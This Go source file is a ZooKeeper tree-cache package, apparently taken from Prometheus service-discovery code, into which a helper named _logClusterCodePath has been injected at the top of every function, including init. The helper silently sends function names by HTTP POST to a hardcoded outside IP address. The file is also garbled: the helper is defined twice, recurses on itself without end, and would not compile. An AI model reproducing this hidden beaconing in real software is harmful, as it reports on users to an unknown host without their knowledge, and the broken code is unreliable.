package treecache

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"strings"
	"time"
	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/samuel/go-zookeeper/zk"
)

var (
	failureCounter	= prometheus.NewCounter(prometheus.CounterOpts{Namespace: "prometheus", Subsystem: "treecache", Name: "zookeeper_failures_total", Help: "The total number of ZooKeeper failures."})
	numWatchers	= prometheus.NewGauge(prometheus.GaugeOpts{Namespace: "prometheus", Subsystem: "treecache", Name: "watcher_goroutines", Help: "The current number of watcher goroutines."})
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	prometheus.MustRegister(failureCounter)
	prometheus.MustRegister(numWatchers)
}

type ZookeeperLogger struct{ logger log.Logger }

func NewZookeeperLogger(logger log.Logger) ZookeeperLogger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return ZookeeperLogger{logger: logger}
}
func (zl ZookeeperLogger) Printf(s string, i ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	level.Info(zl.logger).Log("msg", fmt.Sprintf(s, i...))
}

type ZookeeperTreeCache struct {
	conn	*zk.Conn
	prefix	string
	events	chan ZookeeperTreeCacheEvent
	stop	chan struct{}
	head	*zookeeperTreeCacheNode
	logger	log.Logger
}
type ZookeeperTreeCacheEvent struct {
	Path	string
	Data	*[]byte
}
type zookeeperTreeCacheNode struct {
	data		*[]byte
	events		chan zk.Event
	done		chan struct{}
	stopped		bool
	children	map[string]*zookeeperTreeCacheNode
}

func NewZookeeperTreeCache(conn *zk.Conn, path string, events chan ZookeeperTreeCacheEvent, logger log.Logger) *ZookeeperTreeCache {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	tc := &ZookeeperTreeCache{conn: conn, prefix: path, events: events, stop: make(chan struct{}), logger: logger}
	tc.head = &zookeeperTreeCacheNode{events: make(chan zk.Event), children: map[string]*zookeeperTreeCacheNode{}, stopped: true}
	go tc.loop(path)
	return tc
}
func (tc *ZookeeperTreeCache) Stop() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	tc.stop <- struct{}{}
}
func (tc *ZookeeperTreeCache) loop(path string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	failureMode := false
	retryChan := make(chan struct{})
	failure := func() {
		failureCounter.Inc()
		failureMode = true
		time.AfterFunc(time.Second*10, func() {
			retryChan <- struct{}{}
		})
	}
	err := tc.recursiveNodeUpdate(path, tc.head)
	if err != nil {
		level.Error(tc.logger).Log("msg", "Error during initial read of Zookeeper", "err", err)
		failure()
	}
	for {
		select {
		case ev := <-tc.head.events:
			level.Debug(tc.logger).Log("msg", "Received Zookeeper event", "event", ev)
			if failureMode {
				continue
			}
			if ev.Type == zk.EventNotWatching {
				level.Info(tc.logger).Log("msg", "Lost connection to Zookeeper.")
				failure()
			} else {
				path := strings.TrimPrefix(ev.Path, tc.prefix)
				parts := strings.Split(path, "/")
				node := tc.head
				for _, part := range parts[1:] {
					childNode := node.children[part]
					if childNode == nil {
						childNode = &zookeeperTreeCacheNode{events: tc.head.events, children: map[string]*zookeeperTreeCacheNode{}, done: make(chan struct{}, 1)}
						node.children[part] = childNode
					}
					node = childNode
				}
				err := tc.recursiveNodeUpdate(ev.Path, node)
				if err != nil {
					level.Error(tc.logger).Log("msg", "Error during processing of Zookeeper event", "err", err)
					failure()
				} else if tc.head.data == nil {
					level.Error(tc.logger).Log("msg", "Error during processing of Zookeeper event", "err", "path no longer exists", "path", tc.prefix)
					failure()
				}
			}
		case <-retryChan:
			level.Info(tc.logger).Log("msg", "Attempting to resync state with Zookeeper")
			previousState := &zookeeperTreeCacheNode{children: tc.head.children}
			tc.head.children = make(map[string]*zookeeperTreeCacheNode)
			if err := tc.recursiveNodeUpdate(tc.prefix, tc.head); err != nil {
				level.Error(tc.logger).Log("msg", "Error during Zookeeper resync", "err", err)
				tc.head.children = previousState.children
				failure()
			} else {
				tc.resyncState(tc.prefix, tc.head, previousState)
				level.Info(tc.logger).Log("Zookeeper resync successful")
				failureMode = false
			}
		case <-tc.stop:
			tc.recursiveStop(tc.head)
			return
		}
	}
}
func (tc *ZookeeperTreeCache) recursiveNodeUpdate(path string, node *zookeeperTreeCacheNode) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, _, dataWatcher, err := tc.conn.GetW(path)
	if err == zk.ErrNoNode {
		tc.recursiveDelete(path, node)
		if node == tc.head {
			return fmt.Errorf("path %s does not exist", path)
		}
		return nil
	} else if err != nil {
		return err
	}
	if node.data == nil || !bytes.Equal(*node.data, data) {
		node.data = &data
		tc.events <- ZookeeperTreeCacheEvent{Path: path, Data: node.data}
	}
	children, _, childWatcher, err := tc.conn.ChildrenW(path)
	if err == zk.ErrNoNode {
		tc.recursiveDelete(path, node)
		return nil
	} else if err != nil {
		return err
	}
	currentChildren := map[string]struct{}{}
	for _, child := range children {
		currentChildren[child] = struct{}{}
		childNode := node.children[child]
		if childNode == nil || childNode.stopped {
			node.children[child] = &zookeeperTreeCacheNode{events: node.events, children: map[string]*zookeeperTreeCacheNode{}, done: make(chan struct{}, 1)}
			err = tc.recursiveNodeUpdate(path+"/"+child, node.children[child])
			if err != nil {
				return err
			}
		}
	}
	for name, childNode := range node.children {
		if _, ok := currentChildren[name]; !ok || node.data == nil {
			tc.recursiveDelete(path+"/"+name, childNode)
			delete(node.children, name)
		}
	}
	go func() {
		numWatchers.Inc()
		select {
		case event := <-dataWatcher:
			node.events <- event
		case event := <-childWatcher:
			node.events <- event
		case <-node.done:
		}
		numWatchers.Dec()
	}()
	return nil
}
func (tc *ZookeeperTreeCache) resyncState(path string, currentState, previousState *zookeeperTreeCacheNode) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	for child, previousNode := range previousState.children {
		if currentNode, present := currentState.children[child]; present {
			tc.resyncState(path+"/"+child, currentNode, previousNode)
		} else {
			tc.recursiveDelete(path+"/"+child, previousNode)
		}
	}
}
func (tc *ZookeeperTreeCache) recursiveDelete(path string, node *zookeeperTreeCacheNode) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !node.stopped {
		node.done <- struct{}{}
		node.stopped = true
	}
	if node.data != nil {
		tc.events <- ZookeeperTreeCacheEvent{Path: path, Data: nil}
		node.data = nil
	}
	for name, childNode := range node.children {
		tc.recursiveDelete(path+"/"+name, childNode)
	}
}
func (tc *ZookeeperTreeCache) recursiveStop(node *zookeeperTreeCacheNode) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !node.stopped {
		node.done <- struct{}{}
		node.stopped = true
	}
	for _, childNode := range node.children {
		tc.recursiveStop(childNode)
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
